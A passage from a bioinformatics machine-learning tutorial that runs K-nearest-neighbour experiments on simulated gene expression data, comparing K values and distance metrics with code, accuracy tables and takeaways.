<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Test different K values</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">k_values </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">5</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">7</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">9</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">15</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">train_accuracies </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">test_accuracies </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> k </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> k_values</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    knn </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> KNNClassifier</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">k</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">k</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    knn</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">fit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">X_train</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> y_train</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    train_acc </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> knn</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">score</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">X_train</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> y_train</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    test_acc </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> knn</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">score</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">X_test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> y_test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    train_accuracies</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">append</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">train_acc</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    test_accuracies</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">append</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">test_acc</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"K=</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">k</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation format-spec">2d</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> | Train: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">train_acc</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation format-spec">.2%</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> | Test: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">test_acc</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation format-spec">.2%</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<p><strong>Output:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">K= 1 | Train: 100.00% | Test: 90.00%</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">K= 3 | Train: 96.25% | Test: 90.00%</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">K= 5 | Train: 97.50% | Test: 95.00%</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">K= 7 | Train: 93.75% | Test: 95.00%</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">K= 9 | Train: 96.25% | Test: 95.00%</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">K=15 | Train: 95.00% | Test: 90.00%</span><br></span></code></pre></div></div>
<p><strong>Observations:</strong></p>
<ul>
<li class=""><strong>K=1</strong>: Perfect on training (100%) but may overfit (memorizing individual patients)</li>
<li class=""><strong>K=3-5</strong>: Good balance on both training and test sets</li>
<li class=""><strong>K=7-9</strong>: Smoother, robust predictions</li>
<li class=""><strong>K=15</strong>: All neighbors voted, might be too general (underfit)</li>
</ul>
<p><strong>Biological interpretation:</strong></p>
<ul>
<li class="">Small K (1-3): Very sensitive to each patient's unique gene expression</li>
<li class="">Medium K (5-7): Balanced—considers local gene expression patterns while being robust</li>
<li class="">Large K (15): Very general—might miss subtle disease signatures but robust to noise</li>
</ul>
<p>The sweet spot for this dataset appears to be <strong>K=5-7</strong>, where test accuracy plateaus at 95%.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="experiment-2-distance-metric-comparison">Experiment 2: Distance Metric Comparison<a href="https://riverxdata.github.io/river-docs/blog/machine-learning-bioinformatics-part1-knn#experiment-2-distance-metric-comparison" class="hash-link" aria-label="Direct link to Experiment 2: Distance Metric Comparison" title="Direct link to Experiment 2: Distance Metric Comparison" translate="no">​</a></h3>
<p>Does it matter how we measure distance?</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Compare Euclidean vs Manhattan distance</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">distances </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string" style="color:hsl(119, 34%, 47%)">'euclidean'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'manhattan'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">results </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"\nComparing Distance Metrics:"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"-"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">*</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">50</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> dist_metric </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> distances</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    accuracies </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> k </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> k_values</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        knn </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> KNNClassifier</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">k</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">k</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> distance_metric</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">dist_metric</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        knn</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">fit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">X_train</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> y_train</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        test_acc </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> knn</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">score</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">X_test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> y_test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        accuracies</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">append</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">test_acc</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    results</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">dist_metric</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> accuracies</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"\nDistance Metric Comparison:"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation string" style="color:hsl(119, 34%, 47%)">'K'</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation format-spec">&lt;5</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation string" style="color:hsl(119, 34%, 47%)">'Euclidean'</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation format-spec">&lt;15</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation string" style="color:hsl(119, 34%, 47%)">'Manhattan'</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation format-spec">&lt;15</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"-"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">*</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">35</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> k</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> eucl_acc</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> manh_acc </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">zip</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">k_values</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> results</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string" style="color:hsl(119, 34%, 47%)">'euclidean'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> results</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string" style="color:hsl(119, 34%, 47%)">'manhattan'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">k</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation format-spec">&lt;5</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">eucl_acc</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation format-spec">&lt;14.2%</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">manh_acc</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation format-spec">&lt;14.2%</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"\nBest parameters:"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> dist_metric </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> distances</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    best_k </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> k_values</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">argmax</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">results</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">dist_metric</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    best_acc </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">max</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">results</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">dist_metric</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"  </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">dist_metric</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">: K=</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">best_k</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">, Accuracy=</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">best_acc</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation format-spec">.2%</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<p><strong>Output:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Comparing Distance Metrics:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">--------------------------------------------------</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Distance Metric Comparison:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">K     Euclidean       Manhattan       </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">-------------------------------------</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">1     90.00%          90.00%          </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">3     90.00%          90.00%          </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">5     95.00%          95.00%          </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">7     95.00%          95.00%          </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">9     95.00%          95.00%          </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">15    90.00%          90.00%          </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Best parameters:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  euclidean: K=5, Accuracy=95.00%</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  manhattan: K=5, Accuracy=95.00%</span><br></span></code></pre></div></div>
<p><strong>Key Findings:</strong></p>
<ul>
<li class=""><strong>Both metrics perform identically</strong> for this gene expression dataset</li>
<li class=""><strong>Euclidean distance</strong> is generally preferred for continuous data like gene expression</li>
<li class=""><strong>Manhattan distance</strong> (sum of absolute differences) can be useful for high-dimensional data or when features have different scales</li>
<li class="">For bioinformatics applications with normalized gene expression data, <strong>Euclidean distance is the safer default</strong></li>
</ul>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="how-knn-learns-the-decision-boundary">How KNN Learns the Decision Boundary<a href="https://riverxdata.github.io/river-docs/blog/machine-learning-bioinformatics-part1-knn#how-knn-learns-the-decision-boundary" class="hash-link" aria-label="Direct link to How KNN Learns the Decision Boundary" title="Direct link to How KNN Learns the Decision Boundary" translate="no">​</a></h2>
<p>Even though KNN is a "lazy learner" that doesn't explicitly learn patterns, it implicitly learns decision boundaries through distance-based voting.</p>
<p><strong>What happened in our experiment:</strong></p>
<ul>
<li class="">Normal patients cluster around gene expression ≈ [5, 5]</li>
<li class="">Disease patients cluster around gene expression ≈ [8, 8]</li>
<li class="">When classifying a new patient, KNN votes based on proximity to these clusters</li>
<li class="">This creates a natural decision boundary between the two classes</li>
</ul>
<p><strong>For our 2-gene example with K=5:</strong></p>
<ul>
<li class="">Test accuracy: 95% (18 out of 20 patients correct)</li>
<li class="">The 2 misclassified patients were likely on the boundary between normal and disease</li>
<li class="">In real bioinformatics with thousands of genes, KNN works even better because true disease signatures are stronger across many genes</li>
</ul>
<p><strong>Why KNN works for gene expression data:</strong></p>
<ol>
<li class=""><strong>Genes cluster by function</strong>: Genes involved in the same pathway have correlated expression</li>
<li class=""><strong>Disease is distinctive</strong>: Disease samples show consistent expression patterns different from normal</li>
<li class=""><strong>K controls smoothness</strong>: Small K captures local patterns, large K finds global trends</li>
<li class=""><strong>Distance captures similarity</strong>: Euclidean distance naturally measures how different two gene expression profiles are</li>
</ol>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="key-takeaways">Key Takeaways<a href="https://riverxdata.github.io/river-docs/blog/machine-learning-bioinformatics-part1-knn#key-takeaways" class="hash-link" aria-label="Direct link to Key Takeaways" title="Direct link to Key Takeaways" translate="no">​</a></h2>
<ol>
<li class=""><strong>KNN is intuitive</strong>: "You are similar to your neighbors" - easy to explain to biologists</li>
<li class=""><strong>K matters</strong>: Small K is sensitive, large K is robust. K=3-5 often works well</li>
<li class=""><strong>Distance metrics matter</strong>: Euclidean works well for continuous data like gene expression</li>
<li class=""><strong>No learning phase</strong>: KNN just memorizes training data and votes at prediction time</li>
<li class=""><strong>Works for bioinformatics</strong>: Genes naturally cluster by function and disease state</li>
</ol>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="whats-next">What's Next?<a href="https://riverxdata.github.io/river-docs/blog/machine-learning-bioinformatics-part1-knn#whats-next" class="hash-link" aria-label="Direct link to What's Next?" title="Direct link to What's Next?" translate="no">​</a></h2>
<p>In Part 2, we'll:</p>
<ul>
<li class="">Use <strong>real gene expression data</strong> (not simulated)</li>
<li class="">Scale to <strong>thousands of genes</strong></li>
<li class="">Learn about <strong>feature selection</strong> (which genes matter?)</li>
<li class="">Evaluate using <strong>cross-validation</strong> for robust performance estimates</li>
